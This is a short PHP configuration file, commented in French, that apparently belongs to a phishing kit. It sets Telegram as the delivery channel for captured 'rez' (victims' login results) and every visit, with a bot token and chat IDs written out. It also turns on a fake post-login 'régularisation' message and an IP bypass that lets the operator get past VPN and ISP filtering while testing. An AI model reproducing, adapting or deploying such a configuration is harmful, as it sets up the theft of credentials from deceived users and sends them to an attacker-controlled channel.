<?php



/*---  Rez sur son Mail  ---*/
$mail_sending = false;
$rezmail = "";


/*---  Configuration des OPTIONS  ---*/

     
$msg_login = true;      /* Affiche message régularisation apres le login */

  



/*---  Rez sur bot télégram  ---*/

$telegram_sending = true;                       /* ACTIVE OU NON DE REZ VIA TELEGRAM */
$bot_token = "6737841709:AAH0KO7_rXOGZkNqfFTYb6LBa4BPCUlGD8I"; /* TOKEN BOT */
$chat_login = "6754955805";                 /* CHAT ID : de tout les rez */
$chat_visits = "6754955805";                /* CHAT ID : Toutes connexions validé ou non irons dans se canal */

#---------------------------------REZ DANS TELEGRAM--------------------------------------------#

$ip_dev = "127.0.0.1"; /* NE PAS TOUCHER TU PEUX TESTER VIA LOCALHOST / XAMPP / SERVER LOCAL */
$ip_bypass = "127.0.0.1"; /* TU MET TON IP PERMET DE BYPASS LES VPN / ISP / POUR FAIRE TES TEST DIRECT SUR PLESK */
?>